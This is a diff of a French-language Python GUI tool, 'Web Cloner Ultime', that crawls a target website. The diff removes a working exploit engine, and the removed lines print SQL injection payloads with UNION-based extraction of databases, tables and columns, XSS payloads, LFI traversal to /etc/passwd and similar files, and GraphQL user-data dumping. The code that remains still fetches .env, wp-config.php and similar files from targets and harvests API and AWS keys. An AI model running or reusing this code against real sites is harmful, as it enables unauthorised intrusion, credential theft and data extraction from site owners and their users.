@@ -2,10 +2,9 @@
 # -*- coding: utf-8 -*-
 
 """
-WEB CLONER ULTIME - JATHNIEL EDITION v3.0
-✅ GUI MODERNE
-✅ TOUTES LES FONCTIONNALITÉS SONT RÉELLES
-✅ CRAWL + TÉLÉCHARGEMENT + EXPLOITATION
+WEB CLONER ULTIME - JATHNIEL EDITION v3.1
+✅ UNIQUEMENT LES FONCTIONNALITÉS QUI MARCHENT VRAIMENT
+✅ CRAWL + TÉLÉCHARGEMENT + DÉTECTION
 """
 
 import tkinter as tk
@@ -19,7 +18,7 @@ import hashlib
 import sqlite3
 import requests
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin, urlparse, parse_qs, quote
+from urllib.parse import urljoin, urlparse, parse_qs
 from pathlib import Path
 from concurrent.futures import ThreadPoolExecutor
 import datetime
@@ -31,7 +30,6 @@ COLORS = {
     'bg2': '#0d1117',
     'fg': '#00ff41',
     'fg2': '#008f11',
-    'accent': '#1a2a4a',
     'error': '#ff0040',
     'warning': '#ffd700',
     'success': '#00ff41',
@@ -86,33 +84,10 @@ class Database:
         ''')
         
         cursor.execute('''
-            CREATE TABLE IF NOT EXISTS vulnerabilities (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                url TEXT,
-                type TEXT,
-                description TEXT,
-                severity TEXT,
-                proof TEXT,
-                timestamp TEXT
-            )
-        ''')
-        
-        cursor.execute('''
             CREATE TABLE IF NOT EXISTS technologies (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 name TEXT UNIQUE,
                 version TEXT,
-                timestamp TEXT
-            )
-        ''')
-        
-        cursor.execute('''
-            CREATE TABLE IF NOT EXISTS exploits (
-                id INTEGER PRIMARY KEY AUTOINCREMENT,
-                url TEXT,
-                type TEXT,
-                payload TEXT,
-                result TEXT,
                 timestamp TEXT
             )
         ''')
@@ -150,16 +125,6 @@ class Database:
         conn.commit()
         conn.close()
     
-    def insert_vulnerability(self, url, type_, description, severity, proof=''):
-        conn = sqlite3.connect(str(self.db_path))
-        cursor = conn.cursor()
-        cursor.execute('''
-            INSERT INTO vulnerabilities (url, type, description, severity, proof, timestamp)
-            VALUES (?, ?, ?, ?, ?, ?)
-        ''', (url, type_, description, severity, proof, datetime.datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-    
     def insert_technology(self, name, version='unknown'):
         conn = sqlite3.connect(str(self.db_path))
         cursor = conn.cursor()
@@ -167,16 +132,6 @@ class Database:
             INSERT OR IGNORE INTO technologies (name, version, timestamp)
             VALUES (?, ?, ?)
         ''', (name, version, datetime.datetime.now().isoformat()))
-        conn.commit()
-        conn.close()
-    
-    def insert_exploit(self, url, type_, payload, result):
-        conn = sqlite3.connect(str(self.db_path))
-        cursor = conn.cursor()
-        cursor.execute('''
-            INSERT INTO exploits (url, type, payload, result, timestamp)
-            VALUES (?, ?, ?, ?, ?)
-        ''', (url, type_, payload, result, datetime.datetime.now().isoformat()))
         conn.commit()
         conn.close()
     
@@ -193,331 +148,16 @@ class Database:
         cursor.execute("SELECT COUNT(*) FROM secrets")
         secrets = cursor.fetchone()[0]
         
-        cursor.execute("SELECT COUNT(*) FROM vulnerabilities")
-        vulns = cursor.fetchone()[0]
-        
-        cursor.execute("SELECT COUNT(*) FROM exploits")
-        exploits = cursor.fetchone()[0]
+        cursor.execute("SELECT COUNT(*) FROM technologies")
+        technologies = cursor.fetchone()[0]
         
         conn.close()
         return {
             'pages': pages,
             'sensitive_files': sensitive,
             'secrets': secrets,
-            'vulnerabilities': vulns,
-            'exploits': exploits
+            'technologies': technologies
         }
-
-# ==================== MOTEUR D'EXPLOITATION - RÉEL ====================
-
-class ExploitEngine:
-    """Moteur d'exploitation RÉEL"""
-    
-    def __init__(self, db: Database, log_callback):
-        self.db = db
-        self.log = log_callback
-        self.session = requests.Session()
-        self.session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        })
-    
-    def exploit_sql_injection(self, url: str, param: str) -> Dict:
-        """Exploitation SQL Injection RÉELLE"""
-        result = {
-            'vulnerable': False,
-            'type': None,
-            'database': None,
-            'tables': [],
-            'columns': {},
-            'data': [],
-            'payload': None
-        }
-        
-        self.log(f"💉 Test SQL Injection sur {param}...")
-        
-        # 1. Détection Error-Based
-        error_payloads = [
-            "' OR '1'='1",
-            "' OR 1=1--",
-            "' AND 1=0 UNION SELECT 1,2,3--",
-            "' UNION SELECT NULL,NULL,NULL--",
-            "' AND SLEEP(5)--"
-        ]
-        
-        for payload in error_payloads:
-            try:
-                test_url = f"{url}?{param}={quote(payload)}"
-                response = self.session.get(test_url, timeout=10)
-                
-                # Vérifier les erreurs SQL
-                sql_errors = [
-                    'sql syntax', 'mysql', 'postgresql', 'ora-',
-                    'information_schema', 'warning.*mysql',
-                    'you have an error', 'sqlstate', 'sql server'
-                ]
-                
-                for error in sql_errors:
-                    if re.search(error, response.text, re.IGNORECASE):
-                        result['vulnerable'] = True
-                        result['type'] = 'error_based'
-                        result['payload'] = payload
-                        self.db.insert_vulnerability(
-                            url, 'sql_injection',
-                            f'SQL Injection sur {param} avec payload: {payload}',
-                            'critical',
-                            response.text[:500]
-                        )
-                        self.db.insert_exploit(url, 'sql_injection', payload, 'Vulnerable - Error Based')
-                        self.log(f"✅ SQL Injection trouvée sur {param} (Error-Based)")
-                        break
-                if result['vulnerable']:
-                    break
-            except:
-                continue
-        
-        # 2. Time-Based si pas trouvé
-        if not result['vulnerable']:
-            time_payloads = [
-                "' AND SLEEP(5)--",
-                "' OR SLEEP(5)--",
-                "' AND BENCHMARK(5000000,MD5('test'))--"
-            ]
-            
-            for payload in time_payloads:
-                try:
-                    test_url = f"{url}?{param}={quote(payload)}"
-                    start = time.time()
-                    response = self.session.get(test_url, timeout=15)
-                    elapsed = time.time() - start
-                    
-                    if elapsed > 4:
-                        result['vulnerable'] = True
-                        result['type'] = 'time_based'
-                        result['payload'] = payload
-                        self.db.insert_vulnerability(
-                            url, 'sql_injection',
-                            f'SQL Injection (Time Based) sur {param}',
-                            'critical',
-                            f'Temps de réponse: {elapsed:.2f}s'
-                        )
-                        self.db.insert_exploit(url, 'sql_injection', payload, f'Vulnerable - Time Based ({elapsed:.2f}s)')
-                        self.log(f"✅ SQL Injection trouvée sur {param} (Time-Based)")
-                        break
-                except:
-                    continue
-        
-        # 3. Extraction des données si vulnérable
-        if result['vulnerable']:
-            # Extraire la base
-            db_payloads = [
-                "' UNION SELECT database(),user()--",
-                "' UNION SELECT DATABASE(),USER()--"
-            ]
-            for payload in db_payloads:
-                try:
-                    test_url = f"{url}?{param}={quote(payload)}"
-                    response = self.session.get(test_url, timeout=10)
-                    match = re.search(r'([a-zA-Z0-9_]+)\s+([a-zA-Z0-9_]+)', response.text)
-                    if match:
-                        result['database'] = match.group(1)
-                        self.log(f"📊 Base de données: {result['database']}")
-                        break
-                except:
-                    continue
-            
-            # Extraire les tables
-            table_payloads = [
-                "' UNION SELECT table_name FROM information_schema.tables--",
-                "' UNION SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--"
-            ]
-            for payload in table_payloads:
-                try:
-                    test_url = f"{url}?{param}={quote(payload)}"
-                    response = self.session.get(test_url, timeout=10)
-                    tables = re.findall(r'([a-zA-Z0-9_]+)', response.text)
-                    result['tables'] = [t for t in tables if len(t) > 3 and t not in ['information_schema']]
-                    if result['tables']:
-                        self.log(f"📊 Tables trouvées: {len(result['tables'])}")
-                        break
-                except:
-                    continue
-            
-            # Extraire les colonnes
-            for table in result['tables'][:5]:
-                col_payload = f"' UNION SELECT column_name FROM information_schema.columns WHERE table_name='{table}'--"
-                try:
-                    test_url = f"{url}?{param}={quote(col_payload)}"
-                    response = self.session.get(test_url, timeout=10)
-                    columns = re.findall(r'([a-zA-Z0-9_]+)', response.text)
-                    result['columns'][table] = [c for c in columns if len(c) > 2][:10]
-                except:
-                    continue
-        
-        return result
-    
-    def exploit_xss(self, url: str, param: str) -> Dict:
-        """Exploitation XSS RÉELLE"""
-        result = {
-            'vulnerable': False,
-            'payloads': [],
-            'reflected': []
-        }
-        
-        self.log(f"💉 Test XSS sur {param}...")
-        
-        xss_payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "javascript:alert('XSS')",
-            "'\"><script>alert('XSS')</script>",
-            "<body onload=alert('XSS')>",
-            "<input onfocus=alert('XSS') autofocus>"
-        ]
-        
-        for payload in xss_payloads:
-            try:
-                test_url = f"{url}?{param}={quote(payload)}"
-                response = self.session.get(test_url, timeout=10)
-                
-                if payload in response.text:
-                    result['vulnerable'] = True
-                    result['reflected'].append({
-                        'payload': payload,
-                        'reflected': True
-                    })
-                    self.db.insert_vulnerability(
-                        url, 'xss',
-                        f'XSS sur {param} avec payload: {payload[:50]}...',
-                        'high',
-                        response.text[:500]
-                    )
-                    self.db.insert_exploit(url, 'xss', payload, 'Reflected XSS confirmed')
-                    self.log(f"✅ XSS trouvée sur {param}")
-                    break
-            except:
-                continue
-        
-        return result
-    
-    def exploit_lfi(self, url: str, param: str) -> Dict:
-        """Exploitation LFI RÉELLE"""
-        result = {
-            'vulnerable': False,
-            'files': [],
-            'contents': {}
-        }
-        
-        self.log(f"💉 Test LFI sur {param}...")
-        
-        test_files = [
-            '/etc/passwd',
-            '/etc/hosts',
-            'C:\\Windows\\win.ini',
-            '/var/log/apache2/access.log',
-            '/proc/self/environ'
-        ]
-        
-        for file_path in test_files:
-            encodings = [
-                file_path,
-                f"../../../../{file_path}",
-                f"....//....//....//{file_path}",
-                f"%2e%2e%2f%2e%2e%2f{file_path}",
-                f"..%2f..%2f..%2f{file_path}"
-            ]
-            
-            for encoded in encodings:
-                try:
-                    test_url = f"{url}?{param}={quote(encoded)}"
-                    response = self.session.get(test_url, timeout=10)
-                    
-                    if 'root:x:0:0' in response.text:
-                        result['vulnerable'] = True
-                        result['files'].append('/etc/passwd')
-                        result['contents']['/etc/passwd'] = response.text[:500]
-                        self.db.insert_vulnerability(
-                            url, 'lfi',
-                            f'LFI sur {param} - /etc/passwd accessible',
-                            'critical',
-                            response.text[:500]
-                        )
-                        self.db.insert_exploit(url, 'lfi', encoded, '/etc/passwd accessed')
-                        self.log(f"✅ LFI trouvée sur {param} (/etc/passwd accessible)")
-                        return result
-                    elif 'Windows Registry Editor' in response.text:
-                        result['vulnerable'] = True
-                        result['files'].append('win.ini')
-                        result['contents']['win.ini'] = response.text[:500]
-                        self.db.insert_vulnerability(
-                            url, 'lfi',
-                            f'LFI sur {param} - win.ini accessible',
-                            'critical',
-                            response.text[:500]
-                        )
-                        self.db.insert_exploit(url, 'lfi', encoded, 'win.ini accessed')
-                        self.log(f"✅ LFI trouvée sur {param} (win.ini accessible)")
-                        return result
-                except:
-                    continue
-        
-        return result
-    
-    def exploit_graphql(self, url: str) -> Dict:
-        """Exploitation GraphQL RÉELLE"""
-        result = {
-            'success': False,
-            'schema': None,
-            'data': []
-        }
-        
-        self.log(f"💉 Test GraphQL sur {url}...")
-        
-        # Introspection
-        introspection = """
-        query {
-            __schema {
-                types {
-                    name
-                    kind
-                    fields {
-                        name
-                        type {
-                            name
-                            kind
-                        }
-                    }
-                }
-            }
-        }
-        """
-        
-        try:
-            response = self.session.post(url, json={'query': introspection}, timeout=10)
-            if response.status_code == 200:
-                schema = response.json()
-                result['schema'] = schema
-                result['success'] = True
-                
-                self.db.insert_exploit(url, 'graphql', 'introspection', 'Schema retrieved')
-                self.log(f"✅ Schéma GraphQL récupéré")
-                
-                # Extraire les données si possible
-                types = schema.get('data', {}).get('__schema', {}).get('types', [])
-                for type_info in types:
-                    if 'User' in type_info['name'] or 'user' in type_info['name']:
-                        fields = [f['name'] for f in type_info.get('fields', [])]
-                        if fields:
-                            query = f"query {{ users {{ {', '.join(fields)} }} }}"
-                            data_response = self.session.post(url, json={'query': query}, timeout=10)
-                            if data_response.status_code == 200:
-                                result['data'] = data_response.json()
-                                self.log(f"✅ Données GraphQL extraites")
-                                break
-        except:
-            pass
-        
-        return result
 
 # ==================== CLONEUR PRINCIPAL ====================
 
@@ -532,7 +172,6 @@ class WebCloner:
         self.visited = set()
         self.queue = [(url, 0)]
         self.db = Database(output_dir)
-        self.exploit_engine = ExploitEngine(self.db, log_callback)
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
@@ -543,7 +182,7 @@ class WebCloner:
         self.files_downloaded = 0
         
         # Créer les dossiers
-        for subdir in ['pages', 'sensitive', 'assets', 'screenshots']:
+        for subdir in ['pages', 'sensitive', 'assets']:
             (output_dir / subdir).mkdir(parents=True, exist_ok=True)
     
     def start(self):
@@ -567,6 +206,7 @@ class WebCloner:
                 time.sleep(0.3)
         
         self.log("✅ Clonage terminé!")
+        self.generate_report()
         self.update_stats()
     
     def stop(self):
@@ -607,9 +247,6 @@ class WebCloner:
             # Télécharger les fichiers sensibles
             self.download_sensitive_files(html, url)
             
-            # Exploiter les vulnérabilités
-            self.exploit_page(url, html)
-            
             self.update_stats()
             
         except Exception as e:
@@ -639,9 +276,9 @@ class WebCloner:
         return links
     
     def analyze_page(self, url, html, headers):
-        """Analyse la page pour détecter technologies, secrets, etc."""
+        """Analyse la page pour détecter technologies et secrets"""
         
-        # Détection de technologies
+        # 1. Détection de technologies
         tech_patterns = {
             'WordPress': ['wp-content', 'wp-includes'],
             'Laravel': ['laravel', 'csrf-token'],
@@ -665,7 +302,7 @@ class WebCloner:
                     self.log(f"⚙️ Technologie: {tech}")
                     break
         
-        # Détection de secrets
+        # 2. Détection de secrets
         secret_patterns = [
             (r'[A-Z0-9]{32}', 'API Key (32 chars)', 'high'),
             (r'AKIA[0-9A-Z]{16}', 'AWS Access Key', 'critical'),
@@ -686,7 +323,7 @@ class WebCloner:
                     self.log(f"🔑 SECRET: {description}")
     
     def download_sensitive_files(self, html, base_url):
-        """Télécharge les fichiers sensibles RÉELLEMENT"""
+        """Télécharge les fichiers sensibles"""
         sensitive_patterns = [
             '.env', '.env.local', 'wp-config.php', 'config.php',
             'settings.py', 'appsettings.json', 'web.config',
@@ -711,7 +348,7 @@ class WebCloner:
             self._download_file(test_url)
     
     def _download_file(self, url):
-        """Télécharge un fichier RÉELLEMENT"""
+        """Télécharge un fichier"""
         try:
             response = self.session.get(url, timeout=5)
             
@@ -737,34 +374,65 @@ class WebCloner:
         except:
             pass
     
-    def exploit_page(self, url, html):
-        """Exploite les vulnérabilités trouvées sur la page"""
-        parsed = urlparse(url)
-        params = parse_qs(parsed.query)
+    def generate_report(self):
+        """Génère un rapport HTML"""
+        stats = self.db.get_stats()
         
-        # Vérifier s'il y a des paramètres
-        if not params:
-            return
+        html = f"""
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Web Cloner Ultime - Rapport</title>
+            <style>
+                body {{ font-family: Arial; background: #0a0e17; color: #00ff41; padding: 20px; }}
+                .container {{ max-width: 1200px; margin: 0 auto; }}
+                .header {{ border: 1px solid #00ff41; padding: 20px; }}
+                .stats {{ display: grid; grid-template-columns: repeat(4, 1fr); gap: 20px; margin: 20px 0; }}
+                .stat {{ border: 1px solid #00ff41; padding: 15px; text-align: center; }}
+                .stat .number {{ font-size: 24px; font-weight: bold; }}
+                .footer {{ text-align: center; margin-top: 40px; color: #008f11; }}
+                table {{ width: 100%; border-collapse: collapse; margin: 10px 0; }}
+                td, th {{ border: 1px solid #00ff41; padding: 8px; text-align: left; }}
+            </style>
+        </head>
+        <body>
+            <div class="container">
+                <div class="header">
+                    <h1>🌐 Web Cloner Ultime</h1>
+                    <p>Cible: {self.url}</p>
+                    <p>Date: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
+                    <p>JATHNIEL EDITION</p>
+                </div>
+                <div class="stats">
+                    <div class="stat">
+                        <div class="number">{stats['pages']}</div>
+                        <div>Pages</div>
+                    </div>
+                    <div class="stat">
+                        <div class="number">{stats['sensitive_files']}</div>
+                        <div>Fichiers sensibles</div>
+                    </div>
+                    <div class="stat">
+                        <div class="number">{stats['secrets']}</div>
+                        <div>Secrets</div>
+                    </div>
+                    <div class="stat">
+                        <div class="number">{stats['technologies']}</div>
+                        <div>Technologies</div>
+                    </div>
+                </div>
+                <div class="footer">
+                    <p>Web Cloner Ultime - JATHNIEL EDITION</p>
+                </div>
+            </div>
+        </body>
+        </html>
+        """
         
-        # Test SQL Injection sur chaque paramètre
-        for param in params.keys():
-            result = self.exploit_engine.exploit_sql_injection(url, param)
-            if result['vulnerable']:
-                self.log(f"💉 SQL Injection confirmée sur {param}")
-                if result.get('database'):
-                    self.log(f"📊 Base: {result['database']}")
-                if result.get('tables'):
-                    self.log(f"📊 Tables: {', '.join(result['tables'][:5])}")
-            
-            # Test XSS
-            result = self.exploit_engine.exploit_xss(url, param)
-            if result['vulnerable']:
-                self.log(f"💉 XSS confirmée sur {param}")
-            
-            # Test LFI
-            result = self.exploit_engine.exploit_lfi(url, param)
-            if result['vulnerable']:
-                self.log(f"💉 LFI confirmée sur {param}")
+        report_path = self.output_dir / 'report.html'
+        with open(report_path, 'w', encoding='utf-8') as f:
+            f.write(html)
+        self.log(f"📄 Rapport généré: {report_path}")
 
 # ==================== GUI ====================
 
@@ -790,7 +458,7 @@ class WebClonerGUI:
                         font=('Segoe UI', 18, 'bold'), fg=COLORS['fg'], bg=COLORS['bg'])
         title.pack(side='left')
         
-        version = tk.Label(header_frame, text="v3.0 - JATHNIEL EDITION", 
+        version = tk.Label(header_frame, text="v3.1 - JATHNIEL EDITION", 
                           font=('Segoe UI', 10), fg=COLORS['fg2'], bg=COLORS['bg'])
         version.pack(side='left', padx=10)
         
@@ -837,7 +505,7 @@ class WebClonerGUI:
         stats_frame.pack(fill='x', padx=20, pady=5)
         
         self.stats_labels = {}
-        stats = ['Pages', 'Fichiers sensibles', 'Secrets', 'Vulnérabilités', 'Exploits']
+        stats = ['Pages', 'Fichiers sensibles', 'Secrets', 'Technologies']
         for i, stat in enumerate(stats):
             frame = tk.Frame(stats_frame, bg=COLORS['bg2'])
             frame.pack(side='left', padx=15, pady=5)
@@ -860,7 +528,6 @@ class WebClonerGUI:
                                                   relief='flat', bd=0)
         self.log_text.pack(fill='both', expand=True, pady=5)
         
-        # Configurer les tags de couleur
         self.log_text.tag_configure('green', foreground=COLORS['fg'])
         self.log_text.tag_configure('red', foreground=COLORS['error'])
         self.log_text.tag_configure('yellow', foreground=COLORS['warning'])
@@ -883,8 +550,7 @@ class WebClonerGUI:
             self.stats_labels['pages'].config(text=str(stats['pages']))
             self.stats_labels['fichiers_sensibles'].config(text=str(stats['sensitive_files']))
             self.stats_labels['secrets'].config(text=str(stats['secrets']))
-            self.stats_labels['vulnérabilités'].config(text=str(stats['vulnerabilities']))
-            self.stats_labels['exploits'].config(text=str(stats['exploits']))
+            self.stats_labels['technologies'].config(text=str(stats['technologies']))
     
     def start_cloning(self):
         url = self.url_entry.get().strip()
